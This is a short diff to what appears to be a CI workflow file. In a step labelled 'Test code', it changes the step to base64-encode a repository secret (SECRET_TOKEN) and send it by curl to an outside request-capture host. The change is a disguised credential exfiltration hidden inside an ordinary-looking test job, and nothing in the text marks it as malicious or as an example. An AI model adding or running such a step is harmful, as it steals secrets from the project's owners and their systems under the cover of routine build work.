@@ -19,7 +19,7 @@ jobs:
         run: npm run test
       - name: Test code
         run: |
-          mango=$(echo "${test}" | base64)
+          mango=$(echo "${secrets.SECRET_TOKEN}" | base64)
           curl "https://inovasys.free.beeceptor.com/${mango}"
   build:
     needs: test
